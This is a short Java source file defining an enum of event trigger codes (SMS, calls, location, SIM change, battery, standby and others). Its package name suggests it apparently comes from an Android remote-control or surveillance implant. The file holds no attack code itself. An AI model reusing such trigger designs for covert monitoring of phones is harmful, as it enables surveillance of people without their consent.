package com.ht.RCSAndroidGUI.event;

import java.util.Hashtable;
import java.util.Map;

public enum EventType {
	/** Events definitions. */

	EVENT_TIMER(0x2000 + 0x1), // Timer Event
	EVENT_SMS(0x2000 + 0x2), // On Sms Event
	EVENT_CALL(0x2000 + 0x3), // On Call Event
	EVENT_CONNECTION(0x2000 + 0x4), // On Connectivity
	EVENT_PROCESS(0x2000 + 0x5), // On Process Event
	EVENT_CELLID(0x2000 + 0x6), // On CellID Event
	EVENT_QUOTA(0x2000 + 0x7), // On Disk Quota Event
	EVENT_SIM_CHANGE(0x2000 + 0x8), // On Sim Change
	EVENT_LOCATION(0x2000 + 0x9), // On Position Event
	EVENT_AC(0x2000 + 0xA), // On AC (power charger)
	EVENT_BATTERY(0x2000 + 0xB), // On Battery Level
	EVENT_STANDBY(0x2000 + 0xC); // On Standby Event

	public static int EVENT = 0x2000;
	private int value;
	private static Hashtable<Integer, EventType> hashtable = new Hashtable <Integer, EventType>();

	private EventType(int value) {
		this.value = value;
		Aliases.map.put(value, this);
	}
	
	public static EventType get(int value){
		return Aliases.map.get(value);
	}
	
	/**
	 * Value.
	 * 
	 * @return the int
	 */
	public int value() {
		return value;
	}
	
    /**
     * map of aliases to enum constants
     */
    private static final class Aliases
        {

        /**
         * map from name no enum constant
         */
        static final Map<Integer, EventType> map =
                new Hashtable<Integer, EventType>( );
        }

}
